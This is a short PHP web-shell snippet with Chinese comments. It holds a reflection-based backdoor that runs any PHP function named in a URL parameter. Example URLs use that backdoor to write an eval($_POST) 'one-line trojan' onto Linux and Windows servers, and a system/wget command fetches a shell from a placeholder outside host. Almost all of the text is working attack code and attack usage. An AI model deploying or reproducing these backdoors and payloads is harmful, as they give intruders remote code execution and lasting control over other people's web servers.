<?php
    $func = new ReflectionFunction($_GET[m]);
    echo $func->invokeArgs(array($_GET[c],$_GET[id]));
?>



http://xxx.xxx/md.php?m=file_put_contents&c=test11.php&id=<?@eval($_POST[c]);?> //写入一句话马 for linux
http://xx.xxx/md.php?m=file_put_contents&c=test11.php&id=<?php eval($_POST[c]);?> //写入一句话马 for windows

<?php 
 eval($_POST[c]);
?> 

news.php?m=system&c=wget http://xxx.xxx/igenus/images/suffix/test11.php //当前目录下载一句话马 for linux
